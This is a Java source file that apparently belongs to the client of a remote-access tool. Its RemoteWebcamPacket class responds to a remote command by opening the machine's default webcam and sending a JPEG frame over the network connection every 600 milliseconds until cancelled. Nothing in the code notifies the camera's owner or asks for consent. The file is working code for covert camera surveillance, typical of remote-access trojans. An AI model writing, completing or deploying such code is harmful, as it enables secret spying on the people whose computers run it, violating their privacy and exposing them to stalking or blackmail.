/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.protocol.packets.impl;

import com.github.sarxos.webcam.Webcam;
import com.ctx.client.ChannelHandler;
import com.protocol.packets.Packet;
import com.protocol.packets.PacketType;
import com.protocol.packets.Packets;
import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelHandlerContext;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import lombok.Getter;
import lombok.Setter;

public class RemoteWebcamPacket implements Packet 
{
    @Getter
    private static final Webcam webcam = Webcam.getDefault();
    
    @Setter
    private static boolean isCanceled;
    
    @Override
    public int getOpcode() 
    {
        return Packets.REMOTE_WEBCAM_PACKET.getCode();
    }

    @Override
    public String getDescription() 
    {
        return Packets.REMOTE_WEBCAM_PACKET.getDescription();
    }
    
    @Override
    public PacketType getPacketType() 
    {
        return Packets.REMOTE_WEBCAM_PACKET.getPacketType();
    }
    
    @Override
    public void read(ChannelHandlerContext chc, ByteBuf in) 
    {
        RemoteWebcamPacket.setCanceled(false);
        
        if (!Webcam.getDiscoveryService().isRunning()) 
        {
            Webcam.getDiscoveryService().setEnabled(true);
            Webcam.getDiscoveryService().start();
            Webcam.getDiscoveryService().scan();
        }
        
        while (!isCanceled) 
        {
            ChannelHandler.writePacket(this);
            try 
            {
                Thread.sleep(600);
            } 
            catch (InterruptedException ex) 
            {
                Logger.getLogger(RemoteWebcamPacket.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
    
    @Override
    public void write(ChannelHandlerContext chc, ByteBuf out) 
    {
        try 
        {
            ByteArrayOutputStream baos = new ByteArrayOutputStream(1024);
            
            if (!webcam.isOpen()) 
            {
            webcam.open();
            }
            
            ImageIO.write(webcam.getImage(), "jpg", baos);
            byte[] fileContent = baos.toByteArray();
            out.writeBytes(fileContent, 0, fileContent.length);
        }
        catch (IOException ex) 
    {
            Logger.getLogger(RemoteWebcamPacket.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
